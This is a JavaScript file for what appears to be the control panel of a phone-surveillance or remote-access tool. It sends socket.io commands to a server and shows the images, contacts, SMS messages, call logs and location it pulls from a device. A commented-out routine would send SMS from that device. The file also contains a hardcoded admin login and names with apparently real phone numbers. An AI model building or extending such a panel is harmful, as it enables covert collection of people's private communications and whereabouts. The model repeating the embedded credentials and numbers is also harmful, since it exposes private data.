//Make connection
var socket = io.connect('http://localhost:3000');


//Register
socket.emit('register', {usrType: 'admin', usrName: 'kiran', pass: 'suthar'});


// Query DOM
var imgs = document.getElementById('getImages'),
    cntct = document.getElementById('getContacts'),
    msgs = document.getElementById('getMessages'),
    loc = document.getElementById('getLocation'),
    callHistory = document.getElementById('getCallHistory'),
    dataDiv = document.getElementById('data'),
    notificationDiv = document.getElementById('notification');

//Public variables
var i = 0;

//Emit events on btn click
imgs.addEventListener('click', function () {
    socket.emit('commands', [{command: 'getImages'}]);
});

cntct.addEventListener('click', function () {
    socket.emit('commands', [{command: 'getContacts'}]);
});

callHistory.addEventListener('click', function () {
    socket.emit('commands', [{command: 'getCallHistory', arg1: 100}]);
});

msgs.addEventListener('click', function () {
    socket.emit('commands', [{command: 'getSms', arg1: 100}]);
});

loc.addEventListener('click', function () {
    socket.emit('commands', [{command: 'getLocation'}]);
});

/*
sendSms.addEventListener('click', function () {
    clear();
    socket.emit('commands', [{command: 'sendSms', arg1: '7240505099', arg2: 'Hi Kiran \nI love you Kiran Nehra'}]);
});*/

function clear() {
    i = 0;
    dataDiv.innerHTML = '';
    notificationDiv.innerHTML = '';
}


//Socket event listener
socket.on('notification', function (data) {
    notificationDiv.innerText = data.error;
});


socket.on('usrData', function (data) {

    if (data.dataType !== 'images_div') clear();
    //console.log(data);

    if (data.dataType === 'sms')
        handleSms(data);
    else if (data.dataType === 'calls')
        handleCallLog(data);
    else if (data.dataType === 'contacts')
        handleContacts(data);
    else if (data.dataType === 'location')
        handleLocation(data);
    else if (data.dataType === 'sendSmsStatus')
        handleSmsStatus(data);
    else if (data.dataType === 'images')
        handleImages(data);

});

function handleSms(data) {
    console.log(data.sms);
    var para = document.createElement("p");
    var node = document.createTextNode(data.sms);
    para.appendChild(node);
    dataDiv.appendChild(para);
}

function handleCallLog(data) {
    console.log(data.calls);
    var para = document.createElement("p");
    var node = document.createTextNode(data.calls);
    para.appendChild(node);
    dataDiv.appendChild(para);
}


function handleContacts(data) {
    console.log(data.contacts);
    var persons = JSON.parse(data.contacts);
    notificationDiv.innerHTML = '<p>' + persons.length + '</p>';
    for (var i = 0; i < persons.length; i++) {
        var para = document.createElement("p");
        var node = document.createTextNode(persons[i].name + '\t' + persons[i].phoneNo);
        para.appendChild(node);
        dataDiv.appendChild(para);
    }


    /*Vue.component('contact-tile', {
        props: ['name', 'contact'],
        template: '<div>Hi, {{ name }}. You\'re contact number is {{ contact }}!</div>'
    });

    new Vue({
        el: '#app',
        data: {
            persons: data.contacts_div
        },
        methods: {
            change: function () {
                this.persons = [
                    {name:"Suthar", contact:7240505099},
                    {name:"Ajat Prabha", contact:9610771790},
                    {name:"Abhinav Joshi", contact:7240505099},
                    {name:"Abhinav", contact:7240505099},
                    {name:"Ajat", contact:9610771790},
                    {name:"Abhinav", contact:7240505099}
                ]
            }
        }
    });*/

}

function handleLocation(data) {
    console.log(data.location);
    var para = document.createElement("p");
    var node = document.createTextNode(data.location);
    para.appendChild(node);
    dataDiv.appendChild(para);
}

function handleSmsStatus(data) {
    console.log(data.status + ', ' + data.reason);
    var para = document.createElement("p");
    var node = document.createTextNode(data.status + ', ' + data.reason);
    para.appendChild(node);
    dataDiv.appendChild(para);
}

function handleImages(data) {

    var image = {
        name: data.name,
        date: data.date,
        bucket: data.bucket,
        path: data.path,
        imgData: data.image64
    };

    showImage(image.imgData);

    notificationDiv.innerHTML = '<p>Total ' + ++i + ' images_div found</p>';

    if (i === parseInt(data.length)) {
        console.log(i + ' images_div uploaded');
        notificationDiv.innerHTML += '<p> Done</p>';
    }
}

function showImage(data) {
    var img = document.createElement('img');
    img.marginRight = 10;
    img.setAttribute('margin-right', '10px');
    img.src = 'data:image/png;base64, ' + data;
    dataDiv.appendChild(img);
}
